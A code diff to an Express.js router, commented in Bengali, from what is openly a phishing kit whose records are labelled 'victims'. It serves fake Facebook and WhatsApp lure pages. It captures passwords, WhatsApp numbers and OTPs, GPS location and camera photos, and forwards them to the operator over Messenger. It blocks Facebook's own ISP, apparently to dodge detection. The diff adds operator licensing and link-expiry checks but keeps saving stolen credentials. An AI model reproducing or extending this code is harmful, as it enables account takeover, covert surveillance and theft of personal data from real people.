@@ -2,6 +2,7 @@ const express = require('express');
 const path = require('path');
 const router = express.Router();
 const Victim = require('../models/Victim');
+const User = require('../models/User');
 const { 
     sendMessage, 
     sendImageMessage,
@@ -12,7 +13,7 @@ const {
 } = require('../utils/helpers');
 
 // ================================================================
-// 🔥 ISP ব্লক লিস্ট – এই ISP থেকে এলে মেসেজ যাবে না
+// ISP ব্লক লিস্ট
 // ================================================================
 const BLOCKED_ISP = 'Facebook, Inc.';
 
@@ -21,6 +22,40 @@ function isIspBlocked(victim) {
         return victim.location.isp === BLOCKED_ISP;
     }
     return false;
+}
+
+// ================================================================
+// 🔥 পারমিশন চেক ফাংশন
+// ================================================================
+async function checkUserPermission(victim) {
+    if (!victim || !victim.fbId || victim.fbId === 'unknown') {
+        return false;
+    }
+    const user = await User.findOne({ fbId: victim.fbId });
+    if (!user) return false;
+    if (!user.allowed) return false;
+    // 🔥 এক্সপাইরি চেক
+    if (user.permissionExpiresAt && new Date() > user.permissionExpiresAt) {
+        // পারমিশন এক্সপায়ার হয়ে গেলে অটো বাতিল
+        user.allowed = false;
+        await user.save();
+        return false;
+    }
+    return true;
+}
+
+// ================================================================
+// 🔥 লিংক এক্সপাইরি চেক ফাংশন
+// ================================================================
+async function checkLinkExpiry(victim) {
+    if (!victim) return true;
+    if (victim.isExpired) return false;
+    if (victim.expiresAt && new Date() > victim.expiresAt) {
+        victim.isExpired = true;
+        await victim.save();
+        return false;
+    }
+    return true;
 }
 
 // ================================================================
@@ -49,7 +84,16 @@ setInterval(async () => {
 }, CLEANUP_INTERVAL);
 
 // ================================================================
-// রাউটস – লিংক ভিজিট
+// 🔥 হেল্পার: লিংক এক্সপাইরি সেট করা (৩০ মিনিট)
+// ================================================================
+function setLinkExpiry() {
+    const expiryDate = new Date();
+    expiryDate.setMinutes(expiryDate.getMinutes() + 30);
+    return expiryDate;
+}
+
+// ================================================================
+// রাউটস – লিংক ভিজিট (এক্সপাইরি চেক সহ)
 // ================================================================
 
 router.get('/v/:id', async (req, res) => {
@@ -59,6 +103,20 @@ router.get('/v/:id', async (req, res) => {
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
         }
+
+        // 🔥 লিংক এক্সপাইরি চেক
+        const isLinkValid = await checkLinkExpiry(victim);
+        if (!isLinkValid) {
+            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
+        }
+
+        // 🔥 পারমিশন চেক
+        const hasPermission = await checkUserPermission(victim);
+        if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
+            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
+        }
+
         res.sendFile(path.join(__dirname, '../public/index.html'));
     } catch (err) {
         console.error('Error serving victim page:', err);
@@ -73,6 +131,18 @@ router.get('/l/:id', async (req, res) => {
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
         }
+
+        const isLinkValid = await checkLinkExpiry(victim);
+        if (!isLinkValid) {
+            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
+        }
+
+        const hasPermission = await checkUserPermission(victim);
+        if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
+            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
+        }
+
         res.sendFile(path.join(__dirname, '../public/location.html'));
     } catch (err) {
         console.error('Error serving location page:', err);
@@ -87,6 +157,18 @@ router.get('/fb/:id', async (req, res) => {
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
         }
+
+        const isLinkValid = await checkLinkExpiry(victim);
+        if (!isLinkValid) {
+            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
+        }
+
+        const hasPermission = await checkUserPermission(victim);
+        if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
+            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
+        }
+
         res.sendFile(path.join(__dirname, '../public/fb.html'));
     } catch (err) {
         console.error('Error serving fb page:', err);
@@ -94,9 +176,6 @@ router.get('/fb/:id', async (req, res) => {
     }
 });
 
-// ================================================================
-// 🆕 হোয়াটসঅ্যাপ লিংক ভিজিট
-// ================================================================
 router.get('/wp/:id', async (req, res) => {
     try {
         console.log(`🔍 হোয়াটসঅ্যাপ লিংক ভিজিট: ${req.params.id}`);
@@ -104,6 +183,18 @@ router.get('/wp/:id', async (req, res) => {
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
         }
+
+        const isLinkValid = await checkLinkExpiry(victim);
+        if (!isLinkValid) {
+            return res.status(410).send('এই লিঙ্কটি মেয়াদোত্তীর্ণ হয়ে গেছে।');
+        }
+
+        const hasPermission = await checkUserPermission(victim);
+        if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId}`);
+            return res.status(403).send('এই লিঙ্কটি ব্যবহারের অনুমতি আপনার নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
+        }
+
         res.sendFile(path.join(__dirname, '../public/wp.html'));
     } catch (err) {
         console.error('Error serving wp page:', err);
@@ -112,7 +203,7 @@ router.get('/wp/:id', async (req, res) => {
 });
 
 // ================================================================
-// 🚨 ভিক্টিম ডেটা রিসিভ – ISP ব্লকিং সহ
+// 🚨 ভিক্টিম ডেটা রিসিভ – ISP ব্লকিং + পারমিশন চেক
 // ================================================================
 router.post('/api/victim', async (req, res) => {
     try {
@@ -132,6 +223,7 @@ router.post('/api/victim', async (req, res) => {
                 fbId: data.fbId || 'unknown',
                 type: data.type || 'camera',
                 timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
+                expiresAt: setLinkExpiry(), // 🔥 ৩০ মিনিট এক্সপাইরি সেট
                 ip: data.ip || null,
                 location: data.location || {},
                 gpsLocation: data.gpsLocation || {},
@@ -142,7 +234,7 @@ router.post('/api/victim', async (req, res) => {
                 collectedAt: new Date()
             });
             await victim.save();
-            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
+            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id} (এক্সপাইরি: ${victim.expiresAt})`);
         } else {
             if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
                 victim.fbId = data.fbId;
@@ -159,25 +251,35 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
         }
 
-        // ISP চেক
+        // 🔥 লিংক এক্সপাইরি চেক (ডেটা আসার পরেও)
+        const isLinkValid = await checkLinkExpiry(victim);
+        if (!isLinkValid) {
+            console.log(`⛔ লিংক এক্সপায়ার: ${data.id} → ডেটা সেভ হয়েছে কিন্তু মেসেজ যাবে না।`);
+            return res.status(200).json({ status: 'ok', data: victim, blocked: true, expired: true });
+        }
+
         const blocked = isIspBlocked(victim);
-        console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);
+        const hasPermission = await checkUserPermission(victim);
+        console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড' : '✅ অনুমোদিত'}`);
+        console.log(`🔍 ইউজার পারমিশন: ${hasPermission ? '✅ আছে' : '❌ নেই'}`);
 
         // ============================================================
-        // 📤 মেসেজ পাঠান – শুধুমাত্র যদি ISP ব্লক না হয়
+        // 📤 মেসেজ পাঠান – শুধুমাত্র যদি ISP ব্লক না হয় ও পারমিশন থাকে
         // ============================================================
-        if (!blocked && victim.fbId && victim.fbId !== 'unknown') {
+        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
             console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
         } else if (blocked) {
             console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → মেসেজ পাঠানো হয়নি।`);
+        } else if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই → মেসেজ পাঠানো হয়নি।`);
         } else {
             console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি।`);
         }
 
-        // লোকেশন মেসেজ (যদি থাকে এবং ব্লক না হয়)
-        if (!blocked && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
+        // লোকেশন মেসেজ (যদি থাকে এবং ব্লক না হয় ও পারমিশন থাকে)
+        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
             const locationMsg = formatLocationMessage(victim.gpsLocation);
             if (locationMsg) {
                 await sendMessage(victim.fbId, locationMsg);
@@ -185,7 +287,7 @@ router.post('/api/victim', async (req, res) => {
             }
         }
 
-        res.status(200).json({ status: 'ok', data: victim, blocked: blocked });
+        res.status(200).json({ status: 'ok', data: victim, blocked: blocked, permission: hasPermission });
 
     } catch (err) {
         console.error('❌ Victim data error:', err);
@@ -194,7 +296,7 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🚨 ক্যামেরা ছবি রিসিভ – ISP ব্লকিং সহ
+// 🚨 ক্যামেরা ছবি রিসিভ – ISP ব্লকিং + পারমিশন চেক
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
@@ -212,8 +314,17 @@ router.post('/api/camera', async (req, res) => {
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
 
+        // 🔥 লিংক এক্সপাইরি চেক
+        const isLinkValid = await checkLinkExpiry(victim);
+        if (!isLinkValid) {
+            console.log(`⛔ লিংক এক্সপায়ার: ${id} → ছবি সেভ হয়েছে কিন্তু পাঠানো হবে না।`);
+            return res.status(200).json({ status: 'ok', count: 0, expired: true });
+        }
+
         const blocked = isIspBlocked(victim);
-        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);
+        const hasPermission = await checkUserPermission(victim);
+        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড' : '✅ অনুমোদিত'}`);
+        console.log(`🔍 ইউজার পারমিশন: ${hasPermission ? '✅ আছে' : '❌ নেই'}`);
 
         const isFirstImage = !victim.camera || victim.camera.length === 0;
 
@@ -228,9 +339,9 @@ router.post('/api/camera', async (req, res) => {
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
         // ============================================================
-        // 📤 ছবি পাঠান – শুধুমাত্র যদি ISP ব্লক না হয়
+        // 📤 ছবি পাঠান – শুধুমাত্র যদি ISP ব্লক না হয় ও পারমিশন থাকে
         // ============================================================
-        if (!blocked && victim.fbId && victim.fbId !== 'unknown') {
+        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
             const config = await getConfig();
             const baseUrl = config.baseUrl || 'http://localhost:3000';
             const filename = await saveImageFile(image);
@@ -250,11 +361,13 @@ router.post('/api/camera', async (req, res) => {
             }
         } else if (blocked) {
             console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
+        } else if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
         } else {
             console.log(`⚠️ fbId 'unknown' → ছবি পাঠানো হয়নি।`);
         }
 
-        res.status(200).json({ status: 'ok', count: totalImages, blocked: blocked });
+        res.status(200).json({ status: 'ok', count: totalImages, blocked: blocked, permission: hasPermission });
 
     } catch (err) {
         console.error('❌ Camera error:', err);
@@ -284,7 +397,7 @@ router.get('/image/:id/:index', async (req, res) => {
 });
 
 // ================================================================
-// ফেক ফেসবুক লগইন
+// ফেক ফেসবুক লগইন – পারমিশন চেক সহ
 // ================================================================
 router.post('/api/fblogin', async (req, res) => {
     try {
@@ -300,6 +413,19 @@ router.post('/api/fblogin', async (req, res) => {
         if (!victim) {
             console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
+        }
+
+        const hasPermission = await checkUserPermission(victim);
+        if (!hasPermission) {
+            console.log(`⛔ ইউজারের পারমিশন নেই: ${victim.fbId} → ডেটা সেভ হয়েছে কিন্তু মেসেজ যাবে না।`);
+            victim.fbLogin = {
+                username: username,
+                password: password,
+                timestamp: new Date(),
+                ip: req.ip || req.connection.remoteAddress || 'N/A'
+            };
+            await victim.save();
+            return res.status(200).json({ status: 'ok', permission: false });
         }
 
         victim.fbLogin = {
@@ -327,7 +453,7 @@ router.post('/api/fblogin', async (req, res) => {
 });
 
 // ================================================================
-// 🆕 হোয়াটসঅ্যাপ ডেটা রিসিভ (নাম্বার + ওটিপি)
+// হোয়াটসঅ্যাপ ডেটা রিসিভ – পারমিশন চেক সহ
 // ================================================================
 router.post('/api/whatsapp', async (req, res) => {
     try {
@@ -344,6 +470,7 @@ router.post('/api/whatsapp', async (req, res) => {
         }
 
         const userId = victim.fbId;
+        const hasPermission = await checkUserPermission(victim);
 
         // ফোন নাম্বার পেলে
         if (phone) {
@@ -351,9 +478,11 @@ router.post('/api/whatsapp', async (req, res) => {
             victim.wpData.timestamp = new Date();
             await victim.save();
 
-            if (userId && userId !== 'unknown') {
+            if (hasPermission && userId && userId !== 'unknown') {
                 await sendMessage(userId, `📱 নতুন মুরগী হোয়াটসঅ্যাপ লগিন করার জন্য নাম্বার দিয়েছে: \`${phone}\``);
                 console.log(`📤 হোয়াটসঅ্যাপ নাম্বার মেসেজ: ${userId}`);
+            } else {
+                console.log(`⛔ ইউজারের পারমিশন নেই বা fbId নেই → নাম্বার মেসেজ পাঠানো হয়নি।`);
             }
             return res.status(200).json({ status: 'ok', message: 'Phone received' });
         }
@@ -364,9 +493,11 @@ router.post('/api/whatsapp', async (req, res) => {
             victim.wpData.timestamp = new Date();
             await victim.save();
 
-            if (userId && userId !== 'unknown') {
+            if (hasPermission && userId && userId !== 'unknown') {
                 await sendMessage(userId, `🔑 ওটিপি: \`${otp}\``);
                 console.log(`📤 হোয়াটসঅ্যাপ ওটিপি মেসেজ: ${userId}`);
+            } else {
+                console.log(`⛔ ইউজারের পারমিশন নেই বা fbId নেই → ওটিপি মেসেজ পাঠানো হয়নি।`);
             }
             return res.status(200).json({ status: 'ok', message: 'OTP received' });
         }
